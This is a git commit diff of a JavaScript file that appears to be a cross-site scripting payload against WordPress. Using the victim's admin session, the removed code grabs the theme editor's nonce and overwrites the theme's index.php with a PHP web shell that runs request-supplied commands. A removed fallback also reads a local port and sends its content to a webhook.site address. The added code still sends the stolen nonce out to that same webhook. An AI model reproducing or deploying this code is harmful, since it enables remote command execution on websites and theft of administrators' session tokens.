7f40d745713b0ab8dcddec13beb9619619c5b13f
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 14:05:57 +0300

    Update phaedon.js

--- phaedon.js
+++ phaedon.js
@@ -1,20 +1,9 @@
-async function pepe(){
-    var a = await fetch('/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
-    console.log(a);//try with a different file 
-    return a;
+async function caller(){
+	console.log('calling');
+	const res = await fetch('/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
+	console.log(res);
+	const kek = await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?' + res[1]);
 }
 
-try{
-var a = await pepe();
 
-fetch("/wp-admin/admin-ajax.php", {
-    "headers":{"Content-type":"application/x-www-form-urlencoded"},
-"body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
-?>&action=edit-theme-plugin-file&file=index.php&theme=twentytwentytwo`,
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "include"
-});
-}catch(err){
-    fetch('http://localhost:1024/').then(resp => {return resp.text()}).then(text => {fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+btoa(text))});
-}
+caller();
